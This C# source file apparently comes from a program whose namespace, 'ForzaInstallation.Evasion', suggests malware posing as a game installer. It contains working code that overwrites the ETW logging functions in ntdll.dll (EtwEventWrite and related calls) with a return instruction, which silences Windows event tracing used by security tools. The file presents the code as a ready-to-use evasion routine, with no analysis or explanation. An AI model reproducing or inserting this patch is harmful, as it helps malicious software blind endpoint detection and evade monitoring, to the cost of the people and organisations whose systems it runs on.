using System;
using System.Runtime.InteropServices;

namespace ForzaInstallation.Evasion
{
    internal static class EtwPatch
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        internal static bool Patch()
        {
            try
            {
                var ntdll = GetModuleHandle("ntdll.dll");
                if (ntdll == IntPtr.Zero) return false;
                PatchOne(ntdll, "EtwEventWrite");
                PatchOne(ntdll, "EtwEventWriteTransfer");
                PatchOne(ntdll, "EtwEventWriteString");
                PatchOne(ntdll, "EtwWrite");
                PatchOne(ntdll, "EtwWriteTransfer");
                return true;
            }
            catch { return false; }
        }

        private static void PatchOne(IntPtr ntdll, string name)
        {
            try
            {
                var addr = GetProcAddress(ntdll, name);
                if (addr == IntPtr.Zero) return;
                uint oldProt, dummy;
                VirtualProtect(addr, 1, 0x40, out oldProt);
                Marshal.WriteByte(addr, 0, 0xC3);
                VirtualProtect(addr, 1, oldProt, out dummy);
            }
            catch { }
        }
    }
}
